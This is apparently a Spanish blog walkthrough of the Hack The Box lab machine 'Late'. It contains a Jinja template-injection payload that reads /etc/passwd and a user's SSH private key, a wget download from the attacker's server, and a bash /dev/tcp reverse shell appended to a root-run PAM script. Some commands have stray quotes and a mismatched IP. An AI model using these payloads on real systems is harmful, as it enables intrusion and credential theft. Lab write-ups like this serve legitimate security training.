---
title: 'Late'
description: ''
pubDate: 'May 12 2023'
heroImage: 'https://res.cloudinary.com/djc1umong/image/upload/v1686607648/late_info_ulqc74.webp'
slug: 'box/late'
---

### Escaneo de puertos

Hacemos nuestro escaneo de puertos como es usual y verificamos cuáles están abiertos y qué servicios están corriendo en cada uno, por ejemplo en esta Máquina tenemos el puerto 80 y 22

```bash

nmap -p- --open --min-rate 5000 -Pn 10.10.11.156 -oG puertosAbiertos'
```

Vemos que en el puerto 80 está corriendo un servidor web <i>late.htb</i> lo agregamos a nuestro archivo <i>/etc/hosts</i> de nuestra máquina

```bash
10.10.11.156 late.htb
```

### Enumeración

Mientras hacemos un recorrido por la página notamos que en la parte de abajo tenemos unos nuevos enlaces que apuntan a <i>images.late.htb </i>,
lo añadimos a <i>/etc/hosts </i>para luego ingresar a la URL, y vemos la siguiente vista:

<img
layout="fill"
src='https://res.cloudinary.com/djc1umong/image/upload/v1686607657/fuzzing_enumeration_yydcsi.png'
alt='Enumeración de la maquina Late en Hack The Box'
/>

### Archivo hosts

En el archivo <i>/etc/hosts</i> de nuestra máquina añadimos:

```bash
10.10.11.156 images.late.htb
```

Nos vamos a la nueva URL:

<img
layout="fill"
src="https://res.cloudinary.com/djc1umong/image/upload/v1686607671/late_1_temcpg.webp"
alt="Vista images.late.htb de la maquina Late en hack the box"
/>

Vemos en el título que esta página usa Flask, necesitamos saber como funciona este conversor de imagen a texto
creamos nuestra imagen con Photoshop, GIMP, etc. Testeamos la App para vulnerabilidades comunes como XSS, SQLi y CMDi
abrimos e ingresamos payloads para estas vulnerabilidades enganchamos que una SSTI funciona <i>&#123; &#123; 7 \* 7 &#125; &#125;</i>

Lo subimos a la web y nos retorna un archivo llamado <i>result.txt</i> con el siguiente contenido.

La palabra “Late” nos dice porque un SSTi pudo funcionar (Temp”late”). Al intentar conseguir nuestro RCE al subir una imagen con el siguiente payload por ejemplo

```bash
text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }}"
```

La web lo procesa y al convertir imagen a texto algunos caracteres son añadidos y otros se pierden

```bash
text="f{ ‘’_lsd__. _mro__.subclasses__([‘/etc/passwd’).read() }}"
```

Después de verificar esto notamos que tenemos ejecución de remota de comandos y podemos ver el archivo /etc/passwd
Notamos que hay un usuario "svc_acc" con su llave ssh privada y capacidad de login.
Volvemos a subir nuestro payload, cambiando el path al archivo id_rsa.

```bash
text="{{ ‘’.__class__.__mro__[2].__subclasses__()[40](‘/home/svc_acc/.ssh/id_rsa’).read() }}"
```

Ahora que tenemos el id_rsa hacemos un login con el usuario svc_acc

```bash
chmod 600 id_rsa"
ssh svc_acc@10.10.10.156 -i id_rsa"

```

### Root

Descargamos linpeas e intentamos enumerar rutas con privilegios.
Montamos nuestro servidor

```python
python3 -m http.server 8080"

```

Luego en la máquina Late

```bash
svc_acc@late:~$ wget http://10.10.14.63:8080/linpeas.sh"

chmod +x linpeas.sh
./linpeas.sh
```

Encontramos el archivo ssh-alert.sh.

svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh

```bash
#!/bin/bash
RECIPIENT=”root@late.htb”
SUBJECT=”Email from Server Login: SSH Alert”
BODY=”
A SSH login was detected.
User: $PAM_USER
User IP Host: $PAM_RHOST
Service: $PAM_SERVICE
TTY: $PAM_TTY
Date: `date`
Server: `uname -a`
“
if [ ${PAM_TYPE} = “open_session” ]; then
echo “Subject:${SUBJECT} ${BODY}” | /usr/sbin/sendmail ${RECIPIENT}
fi
```

Vemos que se ejecuta cada vez que entablamos una sesión
inspeccionamos los atributos que tiene aunque no tiene el de
escribir podemos crear un archivo y anexarlo.

```bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
— — -a — — — — e — — /usr/local/sbin/ssh-alert.sh"
```

Creamos un archivo file.txt con el payload de Reverse Shell y lo añadimos
al archivo ssh-alert.sh

```bash
bash -i >& /dev/tcp/10.10.14.63/9999 0>&1"
cat file.txt >> /usr/local/sbin/ssh-alert.sh
```

Configuramos un netcat en la Late y en nuestra máquina hacemos login.

```bash
nc -lvnp 9999

cat flag.txt

```
